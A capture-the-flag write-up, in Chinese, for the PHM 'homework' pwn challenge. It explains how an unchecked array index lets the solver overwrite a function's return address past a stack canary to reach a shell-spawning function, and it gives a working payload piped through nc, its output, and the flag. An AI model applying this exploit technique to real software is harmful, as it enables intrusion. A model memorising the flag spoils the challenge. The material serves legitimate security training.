# PHM #59 Pwn — homework

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 50 |
| 連線 | `nc ctf.hackme.quest 7701` |
| 檔案 | [`/static/homework`](https://ctf.hackme.quest/static/homework) (ELF 32-bit, not stripped) ＋ [`/static/pwn-easy.c`](https://ctf.hackme.quest/static/pwn-easy.c) 原始碼 |
| 提示 | Source Code, Index out bound, Return Address |

## 題目

一個數字管理小程式: 先問名字, 進選單可以 edit / show / sum / dump 一個 `int arr[10]`。目標是拿到 `call_me_maybe()` 裡的 `system("/bin/sh")`。

```c
char name[1024];
void call_me_maybe() { system("/bin/sh"); }   // 要跳到這

void run_program() {
    int arr[10], i, v, act;
    ...
    case 1:  // edit
        scanf("%d", &i);  scanf("%d", &v);
        arr[i] = v;       // ← 沒有邊界檢查!
    case 2:  // show
        scanf("%d", &i);
        printf("arr[%d] is %d\n", i, arr[i]);   // ← 也可任意讀
}
```

## 分析

`arr[i] = v` 的 `i` 完全沒檢查 → **任意相對位址寫入**(index out of bound)。只要算出「return address 在 `arr` 的第幾格」, 就能把它蓋成 `call_me_maybe`。

反組譯確認 stack layout(`objdump -d -M intel`):

```asm
run_program:
  push ebp ; mov ebp,esp ; sub esp,0x48
  mov eax, gs:0x14 ; mov [ebp-0xc], eax   ; ← 有 stack canary (在 ebp-0xc)
  ...
  mov DWORD PTR [ebp+eax*4-0x34], edx     ; arr[i]=v → arr 基底 = ebp-0x34
```

- `arr[0]` 在 `ebp-0x34`, saved return address 在 `ebp+4`。
- 索引 `i`: `ebp-0x34 + 4*i == ebp+4` → `4*i = 0x38` → **`i = 14`**。
- **關鍵**: 這題雖有 canary, 但漏洞是「指定索引單點寫」而非線性溢位。我們只精準蓋 `arr[14]`(return address), **完全不碰 `ebp-0xc` 的 canary**, 所以 epilogue 的 canary 檢查照樣通過, 然後 `ret` 跳到我們寫的位址。
- 非 PIE(`Type: EXEC`), 所以 `call_me_maybe` 位址固定 = `0x080485fb` (= 134514171)。

## 解法

1. 名字隨便送一行。
2. 選 `1` edit, index `14`, value `134514171` (`0x080485fb`)。
3. 選 `0` exit → `run_program` 回返 → canary 通過 → `ret` 到 `call_me_maybe` → shell。
4. shell 裡 `cat flag`。

```bash
python3 -c '
import sys
addr=0x080485fb
sys.stdout.buffer.write(b"pwn\n" + b"1\n14\n%d\n" % addr + b"0\n" + b"cat flag\n")
' > payload
(cat payload; sleep 3) | timeout 25 nc ctf.hackme.quest 7701
```

輸出(節錄):

```
What's your name? 0 > exit
...
 > Index to edit: How many? 0 > exit
...
 > FLAG{Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ}
```

## Flag

```
FLAG{Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ}
```

## 感想

PHM 第一題「真的 pwn」。重點不是 overflow 多長, 而是看懂**任意索引寫就是任意位址寫**: 有 canary 也擋不住「跳過 canary、只點名蓋 return address」。先用 `objdump` 把 `arr` 基底(`ebp-0x34`)和 return address(`ebp+4`)的距離換算成陣列索引(14), 剩下就是填一個固定位址。50 分、361 人解, 是 PHM pwn 線的標準入門。
